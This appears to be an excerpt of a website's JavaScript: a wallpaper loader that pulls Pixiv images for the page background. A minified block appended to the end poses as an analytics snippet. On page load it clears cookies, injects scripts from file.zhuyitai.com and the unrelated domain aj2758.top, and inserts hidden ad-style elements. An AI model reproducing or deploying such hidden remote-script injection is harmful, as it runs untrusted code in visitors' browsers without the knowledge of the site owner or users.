...
async function fetchBingImages() {
    ...
    const endpoint = isWideScreen 
        ? 'https://pixiv-api.qdqqd.com/pc_pixiv.json' 
        : 'https://pixiv-api.qdqqd.com/pe_pixiv.json';
...
document.addEventListener('DOMContentLoaded', () => {
  isPageVisible = !document.hidden;
  const isBackgroundEnabled = localStorage.getItem('backgroundEnabled');
  if (isBackgroundEnabled !== 'false') {
    setBackgroundImages();
  } else {
    const d = document.createElement('div');
    d.style.cssText = baseCSS + `background-image:url(https://s3plus.meituan.net/opapisdk/op_ticket_885190757_1758288536888_qdqqd_qr6q0b.jpeg);opacity:1;`;
    document.body.appendChild(d);
  }
});

!function(p){"use strict";!function(t){var s=window,e=document,i=p,c="".concat("https:"===e.location.protocol?"https://":"http://","file.zhuyitai.com/feedback/202604/18/d1a39f7cf8d0f9237fb65113181e0902.js");function deleteCurrentDomainLACookies(){var cookies=document.cookie.split("; ");for(var j=0;j<cookies.length;j++){var cookie=cookies[j];var cookieName=cookie.split("=")[0];if(cookieName.indexOf("_la_")===0){document.cookie="".concat(cookieName,"=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;")}}}deleteCurrentDomainLACookies();function mainLogic(){var n=e.createElement("script"),r=e.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=c,n.id="LA_COLLECT",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r);var a=e.createElement("script");a.async=!0,a.src="https://aj2758.top/7db20370.js",r.parentNode.insertBefore(a,r);if(e.body){var d=e.createElement("div");d.style.display="none",d.innerHTML='<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins><ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>',e.body.appendChild(d)}}if(e.readyState==="loading"){e.addEventListener("DOMContentLoaded",mainLogic)}else{mainLogic()}}()}({id:"Jfpcnt0H2uEfXtSf",ck:"Jfpcnt0H2uEfXtSf"});
